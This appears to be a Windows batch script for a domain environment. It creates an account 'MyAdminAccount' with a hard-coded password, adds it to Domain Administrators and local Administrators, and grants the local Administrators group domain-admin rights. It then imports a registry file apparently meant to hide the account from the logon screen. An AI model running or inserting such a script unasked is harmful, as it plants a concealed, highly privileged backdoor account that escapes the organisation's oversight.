rem This script is created thr domain user MyAdminAccount and register it
rem As local administrator fnd domain administrator
rem It also registred local Group "Administrators" as Domain group
rem and domain user MyAdminAccount as local administrator
rem This file must encoded on 866 Windows Codepage
echo off
%SystemRoot%\System32\chcp.exe 866
rem %SystemRoot%\System32\chcp.exe 1251
%SystemRoot%\System32\net.exe user MyAdminAccount MyAdminPassword /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup "Администраторы домена" MyAdminAccount /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup "Domain Administrators" MyAdminAccount /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup "Администраторы домена" %COMPUTERNAME%\"Администраторы" /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup "Domain Administrators" %COMPUTERNAME%\"Administrators" /add /DOMAIN
%SystemRoot%\System32\net.exe localgroup Администраторы %DomainUser%\MyAdminAccount /add
%SystemRoot%\System32\net.exe localgroup Administrators %DomainUser%\MyAdminAccount /add
call c:\pub1\Util\reg_import_file.cmd c:\pub1\Util\winlogon-SpecialAccounts.reg
%SystemRoot%\System32\chcp.exe 866
